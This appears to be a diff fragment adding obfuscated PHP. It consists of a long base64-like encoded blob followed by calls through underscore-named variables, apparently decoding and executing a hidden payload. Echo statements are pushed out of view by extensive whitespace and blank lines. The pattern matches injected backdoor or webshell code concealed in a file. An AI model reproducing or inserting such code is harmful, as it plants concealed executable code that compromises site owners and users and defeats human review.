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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
